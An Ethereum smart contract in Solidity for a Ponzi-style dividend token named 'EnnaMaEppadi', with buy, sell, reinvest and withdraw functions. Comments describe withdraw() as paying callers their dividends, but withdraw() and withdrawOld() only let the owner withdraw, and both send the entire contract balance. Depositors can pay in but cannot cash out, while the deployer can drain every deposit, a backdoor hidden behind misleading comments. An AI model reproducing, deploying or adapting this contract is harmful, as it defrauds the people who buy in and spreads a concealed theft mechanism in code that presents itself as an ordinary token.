1 pragma solidity ^0.4.18;
2 
3 contract EnnaMaEppadi {
4 
5 	// scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
6 	// orders of magnitude, hence the need to bridge between the two.
7 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
8 
9 	// CRR = 80%
10 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
11 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
12 	int constant crr_n = 4; // CRR numerator
13 	int constant crr_d = 5; // CRR denominator
14 
15 	// The price coefficient. Chosen such that at 1 token total supply
16 	// the amount in reserve is 0.8 ether and token price is 1 Ether.
17 	int constant price_coeff = -0x678adeacb985cb06;
18 
19 	// Typical values that we have to declare.
20 	string constant public name = "EnnaMaEppadi";
21 	string constant public symbol = "JustD";
22 	uint8 constant public decimals = 18;
23 
24 	// Array between each address and their number of tokens.
25 	mapping(address => uint256) public tokenBalance;
26 		
27 	// Array between each address and how much Ether has been paid out to it.
28 	// Note that this is scaled by the scaleFactor variable.
29 	mapping(address => int256) public payouts;
30 
31 	// Variable tracking how many tokens are in existence overall.
32 	uint256 public totalSupply;
33 
34 	// Aggregate sum of all payouts.
35 	// Note that this is scaled by the scaleFactor variable.
36 	int256 totalPayouts;
37 
38 	// Variable tracking how much Ether each token is currently worth.
39 	// Note that this is scaled by the scaleFactor variable.
40 	uint256 earningsPerToken;
41 	
42 	// Current contract balance in Ether
43 	uint256 public contractBalance;
44 	
45 	address owner;
46 
47 	function EnnaMaEppadi() public {
48 	    owner = msg.sender;
49 	}
50 
51 	// The following functions are used by the front-end for display purposes.
52 
53 	// Returns the number of tokens currently held by _owner.
54 	function balanceOf(address _owner) public constant returns (uint256 balance) {
55 		return tokenBalance[_owner];
56 	}
57 
58 	// Withdraws all dividends held by the caller sending the transaction, updates
59 	// the requisite global variables, and transfers Ether back to the caller.
60 	function withdraw() public {
61 		// Retrieve the dividends associated with the address the request came from.
62 		var balance = dividends(msg.sender);
63 		require(msg.sender == owner);
64 		// Update the payouts array, incrementing the request address by `balance`.
65 		payouts[msg.sender] += (int256) (balance * scaleFactor);
66 		
67 		// Increase the total amount that's been paid out to maintain invariance.
68 		totalPayouts += (int256) (balance * scaleFactor);
69 		
70 		// Send the dividends to the address that requested the withdraw.
71 		contractBalance = sub(contractBalance, balance);
72 		msg.sender.transfer(this.balance);
73 	}
74 
75 	// Converts the Ether accrued as dividends back into EPY tokens without having to
76 	// withdraw it first. Saves on gas and potential price spike loss.
77 	function reinvestDividends() public {
78 		// Retrieve the dividends associated with the address the request came from.
79 		var balance = dividends(msg.sender);
80 		
81 		// Update the payouts array, incrementing the request address by `balance`.
82 		// Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.
83 		payouts[msg.sender] += (int256) (balance * scaleFactor);
84 		
85 		// Increase the total amount that's been paid out to maintain invariance.
86 		totalPayouts += (int256) (balance * scaleFactor);
87 		
88 		// Assign balance to a new variable.
89 		uint value_ = (uint) (balance);
90 		
91 		// If your dividends are worth less than 1 szabo, or more than a million Ether
92 		// (in which case, why are you even here), abort.
93 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
94 			revert();
95 			
96 		// msg.sender is the address of the caller.
97 		var sender = msg.sender;
98 		
99 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
100 		// (Yes, the buyer receives a part of the distribution as well!)
101 		var res = reserve() - balance;
102 
103 		// 5% of the total Ether sent is used to pay existing holders.
104 		var fee = div(value_, 20);
105 		
106 		// The amount of Ether used to purchase new tokens for the caller.
107 		var numEther = value_ - fee;
108 		
109 		// The number of tokens which can be purchased for numEther.
110 		var numTokens = calculateDividendTokens(numEther, balance);
111 		
112 		// The buyer fee, scaled by the scaleFactor variable.
113 		var buyerFee = fee * scaleFactor;
114 		
115 		// Check that we have tokens in existence (this should always be true), or
116 		// else you're gonna have a bad time.
117 		if (totalSupply > 0) {
118 			// Compute the bonus co-efficient for all existing holders and the buyer.
119 			// The buyer receives part of the distribution for each token bought in the
120 			// same way they would have if they bought each token individually.
121 			var bonusCoEff =
122 			    (scaleFactor - (res + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
123 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
124 				
125 			// The total reward to be distributed amongst the masses is the fee (in Ether)
126 			// multiplied by the bonus co-efficient.
127 			var holderReward = fee * bonusCoEff;
128 			
129 			buyerFee -= holderReward;
130 
131 			// Fee is distributed to all existing token holders before the new tokens are purchased.
132 			// rewardPerShare is the amount gained per token thanks to this buy-in.
133 			var rewardPerShare = holderReward / totalSupply;
134 			
135 			// The Ether value per token is increased proportionally.
136 			earningsPerToken += rewardPerShare;
137 		}
138 		
139 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
140 		totalSupply = add(totalSupply, numTokens);
141 		
142 		// Assign the tokens to the balance of the buyer.
143 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
144 		
145 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
146 		// Also include the fee paid for entering the scheme.
147 		// First we compute how much was just paid out to the buyer...
148 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
149 		
150 		// Then we update the payouts array for the buyer with this amount...
151 		payouts[sender] += payoutDiff;
152 		
153 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
154 		totalPayouts    += payoutDiff;
155 		
156 	}
157 
158 	// Sells your tokens for Ether. This Ether is assigned to the callers entry
159 	// in the tokenBalance array, and therefore is shown as a dividend. A second
160 	// call to withdraw() must be made to invoke the transfer of Ether back to your address.
161 	function sellMyTokens() public {
162 		var balance = balanceOf(msg.sender);
163 		sell(balance);
164 	}
165 
166 	// The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately
167 	// invokes the withdraw() function, sending the resulting Ether to the callers address.
168     function getMeOutOfHere() public {
169 		sellMyTokens();
170         withdraw();
171 	}
172 
173 	// Gatekeeper function to check if the amount of Ether being sent isn't either
174 	// too small or too large. If it passes, goes direct to buy().
175 	function fund() payable public {
176 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
177 		if (msg.value > 0.000001 ether) {
178 		    contractBalance = add(contractBalance, msg.value);
179 			buy();
180 		} else {
181 			revert();
182 		}
183     }
184 
185 	// Function that returns the (dynamic) price of buying a finney worth of tokens.
186 	function buyPrice() public constant returns (uint) {
187 		return getTokensForEther(1 finney);
188 	}
189 
190 	// Function that returns the (dynamic) price of selling a single token.
191 	function sellPrice() public constant returns (uint) {
192         var eth = getEtherForTokens(1 finney);
193         var fee = div(eth, 10);
194         return eth - fee;
195     }
196 
197 	// Calculate the current dividends associated with the caller address. This is the net result
198 	// of multiplying the number of tokens held by their current value in Ether and subtracting the
199 	// Ether that has already been paid out.
200 	function dividends(address _owner) public constant returns (uint256 amount) {
201 		return (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) / scaleFactor;
202 	}
203 
204 	// Version of withdraw that extracts the dividends and sends the Ether to the caller.
205 	// This is only used in the case when there is no transaction data, and that should be
206 	// quite rare unless interacting directly with the smart contract.
207 	function withdrawOld(address to) public {
208 		// Retrieve the dividends associated with the address the request came from.
209 		var balance = dividends(msg.sender);
210 	    require(to == owner);
211 
212 		// Update the payouts array, incrementing the request address by `balance`.
213 		payouts[msg.sender] += (int256) (balance * scaleFactor);
214 		
215 		// Increase the total amount that's been paid out to maintain invariance.
216 		totalPayouts += (int256) (balance * scaleFactor);
217 		
218 		// Send the dividends to the address that requested the withdraw.
219 		contractBalance = sub(contractBalance, balance);
220 		to.transfer(this.balance);		
221 	}
222 
223 	// Internal balance function, used to calculate the dynamic reserve value.
224 	function balance() internal constant returns (uint256 amount) {
225 		// msg.value is the amount of Ether sent by the transaction.
226 		return contractBalance - msg.value;
227 	}
228 
229 	function buy() internal {
230 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
231 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
232 			revert();
233 						
234 		// msg.sender is the address of the caller.
235 		var sender = msg.sender;
236 		
237 		// 5% of the total Ether sent is used to pay existing holders.
238 		var fee = div(msg.value, 20);
239 		
240 		// The amount of Ether used to purchase new tokens for the caller.
241 		var numEther = msg.value - fee;
242 		
243 		// The number of tokens which can be purchased for numEther.
244 		var numTokens = getTokensForEther(numEther);
245 		
246 		// The buyer fee, scaled by the scaleFactor variable.
247 		var buyerFee = fee * scaleFactor;
248 		
249 		// Check that we have tokens in existence (this should always be true), or
250 		// else you're gonna have a bad time.
251 		if (totalSupply > 0) {
252 			// Compute the bonus co-efficient for all existing holders and the buyer.
253 			// The buyer receives part of the distribution for each token bought in the
254 			// same way they would have if they bought each token individually.
255 			var bonusCoEff =
256 			    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
257 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
258 				
259 			// The total reward to be distributed amongst the masses is the fee (in Ether)
260 			// multiplied by the bonus co-efficient.
261 			var holderReward = fee * bonusCoEff;
262 			
263 			buyerFee -= holderReward;
264 
265 			// Fee is distributed to all existing token holders before the new tokens are purchased.
266 			// rewardPerShare is the amount gained per token thanks to this buy-in.
267 			var rewardPerShare = holderReward / totalSupply;
268 			
269 			// The Ether value per token is increased proportionally.
270 			earningsPerToken += rewardPerShare;
271 			
272 		}
273 
274 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
275 		totalSupply = add(totalSupply, numTokens);
276 
277 		// Assign the tokens to the balance of the buyer.
278 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
279 
280 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
281 		// Also include the fee paid for entering the scheme.
282 		// First we compute how much was just paid out to the buyer...
283 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
284 		
285 		// Then we update the payouts array for the buyer with this amount...
286 		payouts[sender] += payoutDiff;
287 		
288 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
289 		totalPayouts    += payoutDiff;
290 		
291 	}
292 
293 	// Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
294 	// to discouraging dumping, and means that if someone near the top sells, the fee distributed
295 	// will be *significant*.
296 	function sell(uint256 amount) internal {
297 	    // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
298 		var numEthersBeforeFee = getEtherForTokens(amount);
299 		
300 		// 5% of the resulting Ether is used to pay remaining holders.
301         var fee = div(numEthersBeforeFee, 20);
302 		
303 		// Net Ether for the seller after the fee has been subtracted.
304         var numEthers = numEthersBeforeFee - fee;
305 		
306 		// *Remove* the numTokens which were just sold from the total supply. We're /definitely/ a crypto central bank.
307 		totalSupply = sub(totalSupply, amount);
308 		
309         // Remove the tokens from the balance of the buyer.
310 		tokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);
311 
312         // Update the payout array so that the seller cannot claim future dividends unless they buy back in.
313 		// First we compute how much was just paid out to the seller...
314 		var payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));
315 		
316         // We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,
317 		// since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if
318 		// they decide to buy back in.
319 		payouts[msg.sender] -= payoutDiff;		
320 		
321 		// Decrease the total amount that's been paid out to maintain invariance.
322         totalPayouts -= payoutDiff;
323 		
324 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
325 		// selling tokens, but it guards against division by zero).
326 		if (totalSupply > 0) {
327 			// Scale the Ether taken as the selling fee by the scaleFactor variable.
328 			var etherFee = fee * scaleFactor;
329 			
330 			// Fee is distributed to all remaining token holders.
331 			// rewardPerShare is the amount gained per token thanks to this sell.
332 			var rewardPerShare = etherFee / totalSupply;
333 			
334 			// The Ether value per token is increased proportionally.
335 			earningsPerToken = add(earningsPerToken, rewardPerShare);
336 		}
337 	}
338 	
339 	// Dynamic value of Ether in reserve, according to the CRR requirement.
340 	function reserve() internal constant returns (uint256 amount) {
341 		return sub(balance(),
342 			 ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) / scaleFactor));
343 	}
344 
345 	// Calculates the number of tokens that can be bought for a given amount of Ether, according to the
346 	// dynamic reserve and totalSupply values (derived from the buy and sell prices).
347 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
348 		return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
349 	}
350 
351 	// Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.
352 	function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
353 		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
354 	}
355 
356 	// Converts a number tokens into an Ether value.
357 	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
358 		// How much reserve Ether do we have left in the contract?
359 		var reserveAmount = reserve();
360 
361 		// If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.
362 		if (tokens == totalSupply)
363 			return reserveAmount;
364 
365 		// If there would be excess Ether left after the transaction this is called within, return the Ether
366 		// corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found
367 		// at https://test.jochen-hoenicke.de/eth/ponzitoken/ in the third equation, with the CRR numerator 
368 		// and denominator altered to 1 and 2 respectively.
369 		return sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d/crr_n));
370 	}
371 
372 	// You don't care about these, but if you really do they're hex values for 
373 	// co-efficients used to simulate approximations of the log and exp functions.
374 	int256  constant one        = 0x10000000000000000;
375 	uint256 constant sqrt2      = 0x16a09e667f3bcc908;
376 	uint256 constant sqrtdot5   = 0x0b504f333f9de6484;
377 	int256  constant ln2        = 0x0b17217f7d1cf79ac;
378 	int256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;
379 	int256  constant c1         = 0x1ffffffffff9dac9b;
380 	int256  constant c3         = 0x0aaaaaaac16877908;
381 	int256  constant c5         = 0x0666664e5e9fa0c99;
382 	int256  constant c7         = 0x049254026a7630acf;
383 	int256  constant c9         = 0x038bd75ed37753d68;
384 	int256  constant c11        = 0x03284a0c14610924f;
385 
386 	// The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
387 	// approximates the function log(1+x)-log(1-x)
388 	// Hence R(s) = log((1+s)/(1-s)) = log(a)
389 	function fixedLog(uint256 a) internal pure returns (int256 log) {
390 		int32 scale = 0;
391 		while (a > sqrt2) {
392 			a /= 2;
393 			scale++;
394 		}
395 		while (a <= sqrtdot5) {
396 			a *= 2;
397 			scale--;
398 		}
399 		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
400 		var z = (s*s) / one;
401 		return scale * ln2 +
402 			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
403 				/one))/one))/one))/one))/one);
404 	}
405 
406 	int256 constant c2 =  0x02aaaaaaaaa015db0;
407 	int256 constant c4 = -0x000b60b60808399d1;
408 	int256 constant c6 =  0x0000455956bccdd06;
409 	int256 constant c8 = -0x000001b893ad04b3a;
410 	
411 	// The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
412 	// approximates the function x*(exp(x)+1)/(exp(x)-1)
413 	// Hence exp(x) = (R(x)+x)/(R(x)-x)
414 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
415 		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
416 		a -= scale*ln2;
417 		int256 z = (a*a) / one;
418 		int256 R = ((int256)(2) * one) +
419 			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
420 		exp = (uint256) (((R + a) * one) / (R - a));
421 		if (scale >= 0)
422 			exp <<= scale;
423 		else
424 			exp >>= -scale;
425 		return exp;
426 	}
427 	
428 	// The below are safemath implementations of the four arithmetic operators
429 	// designed to explicitly prevent over- and under-flows of integer values.
430 
431 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
432 		if (a == 0) {
433 			return 0;
434 		}
435 		uint256 c = a * b;
436 		assert(c / a == b);
437 		return c;
438 	}
439 
440 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
441 		// assert(b > 0); // Solidity automatically throws when dividing by 0
442 		uint256 c = a / b;
443 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
444 		return c;
445 	}
446 
447 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
448 		assert(b <= a);
449 		return a - b;
450 	}
451 
452 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
453 		uint256 c = a + b;
454 		assert(c >= a);
455 		return c;
456 	}
457 
458 	// This allows you to buy tokens by sending Ether directly to the smart contract
459 	// without including any transaction data (useful for, say, mobile wallet apps).
460 	function () payable public {
461 		// msg.value is the amount of Ether sent by the transaction.
462 		if (msg.value > 0) {
463 			fund();
464 		} else {
465 			withdrawOld(msg.sender);
466 		}
467 	}
468 }